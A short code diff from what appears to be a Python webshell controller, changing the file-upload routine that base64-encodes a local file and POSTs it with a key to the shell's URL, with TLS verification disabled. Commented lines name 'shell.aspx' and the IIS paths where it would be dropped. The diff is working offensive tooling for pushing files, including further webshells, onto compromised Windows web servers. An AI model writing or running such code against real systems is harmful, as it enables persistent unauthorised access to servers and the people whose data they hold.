@@ -81,7 +81,7 @@ def upload_file(webshell,args):
     #webshell,filename,dest_path
     try:
         if len(args)<3:
-            print("Usage : upload <filename ; file must be in file folder> <destination path>")
+            print("Usage : upload <filename ; file must be in file folder> <destination path including new file name>")
         #filename = "shell.aspx"#input("File name to upload : ")
         #path= input("path on the server : ")
         #path="C:\\windows\\temp\\"#"C:\\inetpub\\wwwroot\\aspnet_client\\"
@@ -93,7 +93,7 @@ def upload_file(webshell,args):
         p=open("file/"+filename,"rb")
         content=base64.b64encode(p.read())
         p.close()
-        raw_data=base64.b64encode(bytearray(b64command.replace("{filename}",dest_path+filename).replace("{content}",content.decode("utf-8")).replace("{KEY}",KEY),"UTF-8"))
+        raw_data=base64.b64encode(bytearray(b64command.replace("{filename}",dest_path).replace("{content}",content.decode("utf-8")).replace("{KEY}",KEY),"UTF-8"))
         #print(raw_data)
         x = requests.post(URL, data = raw_data, verify=False)
         if "r^" in x.text:
